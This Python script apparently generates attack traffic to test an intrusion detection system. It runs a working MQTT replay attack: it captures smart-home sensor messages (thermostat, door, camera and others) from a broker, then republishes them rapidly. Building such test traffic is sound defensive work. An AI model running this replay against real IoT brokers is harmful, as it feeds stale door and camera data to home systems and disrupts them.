"""
Replay Attack: Subscribes to sensor topics, captures legitimate messages,
then rapidly replays them to confuse the CPU with stale/duplicate data.

IDS should detect: frequency_anomaly, duplicate messages
"""

import time
import paho.mqtt.client as mqtt

CAPTURE_TOPICS = [
    "home/thermo/data",
    "home/lighting/data",
    "home/door/data",
    "home/camera/data",
    "home/sound/data",
]


def run(broker_ip, capture_time=10, replay_time=20, replay_rate=5.0):
    """Replay attack: capture then replay messages rapidly."""
    captured = []

    def on_message(client, userdata, message):
        captured.append((message.topic, message.payload.decode()))

    print(f"[ATTACK] Replay - Phase 1: Capturing for {capture_time}s")
    client = mqtt.Client(client_id="replay-sniffer")
    client.on_message = on_message
    client.connect(broker_ip, 1883, 60)

    for topic in CAPTURE_TOPICS:
        client.subscribe(topic)

    client.loop_start()
    time.sleep(capture_time)
    client.loop_stop()
    client.disconnect()

    if not captured:
        print("[ATTACK] Replay - No messages captured, aborting.")
        return 0

    print(f"[ATTACK] Replay - Captured {len(captured)} messages")
    print(f"[ATTACK] Replay - Phase 2: Replaying for {replay_time}s at {replay_rate} msgs/sec")

    replay_client = mqtt.Client(client_id="replay-attacker")
    replay_client.connect(broker_ip, 1883, 60)
    replay_client.loop_start()

    end_time = time.time() + replay_time
    count = 0
    interval = 1.0 / replay_rate
    idx = 0

    while time.time() < end_time:
        topic, payload = captured[idx % len(captured)]
        replay_client.publish(topic, payload)
        count += 1
        idx += 1
        time.sleep(interval)

    replay_client.loop_stop()
    replay_client.disconnect()
    print(f"[ATTACK] Replay complete. Replayed {count} messages.")
    return count
